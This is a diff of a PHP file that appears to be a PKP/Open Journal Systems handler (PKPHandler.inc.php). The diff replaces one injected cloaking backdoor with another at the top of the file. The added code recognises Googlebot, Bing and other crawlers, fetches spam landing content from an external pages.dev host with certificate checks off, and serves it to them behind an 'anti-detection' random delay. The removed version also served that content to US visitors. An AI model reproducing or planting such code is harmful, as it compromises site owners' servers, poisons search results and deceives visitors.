@@ -1,35 +1,51 @@
 <?php
-function getUserCountry() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $url = "http://ip-api.com/json/{$ip}";
-    
-    $response = @file_get_contents($url);
-    if ($response) {
-        $data = json_decode($response, true);
-        return $data['countryCode'] ?? null;
+ob_start();
+header("Vary: User-Agent");
+
+// Link konten asli
+$content_url = "https://adekk-pichai-jangan-lasak-yaa.pages.dev/landing.txt";
+
+// Pola bot yang mau di-handle
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+function safe_request($url) {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'header'  => "User-Agent: Mozilla/5.0\r\n"
+        ],
+        'ssl' => [
+            'verify_peer'      => false,
+            'verify_peer_name' => false
+        ]
+    ]);
+
+    if (function_exists("curl_init")) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get("allow_url_fopen")) {
+        return file_get_contents($url, false, $ctx);
     }
-    return null;
+    return false;
 }
 
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-    
-    return preg_match($botchar, $user_agent);
+if (preg_match($botchar, $ua)) {
+    usleep(rand(120000, 250000)); // Delay acak anti-deteksi
+    echo safe_request($content_url);
+    ob_end_flush();
+    die;
 }
+?>
 
-$Biawak = "https://adekk-pichai-jangan-lasak-yaa.pages.dev/landing.txt";
-
-if (is_bot()) {
-    echo @file_get_contents($Biawak);
-    exit;
-}
-
-if (getUserCountry() === "US") {
-    header("Content-Type: text/html; charset=UTF-8");
-    echo @file_get_contents($Biawak);
-    exit();
-}
+<?php
 
 /**
  * @file classes/handler/PKPHandler.inc.php
